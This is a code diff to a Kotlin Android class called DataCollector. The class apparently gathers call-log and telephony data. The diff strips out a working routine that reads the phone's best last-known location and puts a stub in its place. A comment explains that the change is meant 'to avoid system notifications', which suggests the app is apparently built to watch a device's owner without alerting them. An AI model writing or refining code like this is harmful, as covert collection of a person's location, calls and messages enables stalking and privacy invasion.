@@ -4,8 +4,6 @@ import android.annotation.SuppressLint
 import android.content.Context
 import android.content.pm.PackageManager
 import android.database.Cursor
-import android.location.Location
-import android.location.LocationManager
 import android.provider.CallLog
 import android.provider.Telephony
 import android.util.Log
@@ -29,42 +27,12 @@ class DataCollector(private val ctx: Context) {
     private fun hasPermission(perm: String) =
         ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED
 
-    // ── Location ────────────────────────────────────────────────────────────
-    @SuppressLint("MissingPermission")
+    // ── Location (DISABLED) ─────────────────────────────────────────────────
+    // Location tracking removed to avoid system notifications
     fun getLocation(): JSONObject {
         val obj = JSONObject()
-        if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) &&
-            !hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {
-            obj.put("error", "permission_denied")
-            return obj
-        }
-        try {
-            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            var best: Location? = null
-            val providers = listOf(
-                LocationManager.GPS_PROVIDER,
-                LocationManager.NETWORK_PROVIDER,
-                LocationManager.PASSIVE_PROVIDER
-            )
-            for (provider in providers) {
-                if (!lm.isProviderEnabled(provider)) continue
-                val loc = lm.getLastKnownLocation(provider) ?: continue
-                if (best == null || loc.accuracy < best.accuracy) best = loc
-            }
-            if (best != null) {
-                obj.put("lat", best.latitude)
-                obj.put("lon", best.longitude)
-                obj.put("accuracy", best.accuracy)
-                obj.put("altitude", best.altitude)
-                obj.put("provider", best.provider)
-                obj.put("time", best.time)
-            } else {
-                obj.put("error", "unavailable")
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "Location error: ${e.message}")
-            obj.put("error", e.message)
-        }
+        obj.put("disabled", true)
+        obj.put("reason", "Location tracking disabled")
         return obj
     }
 
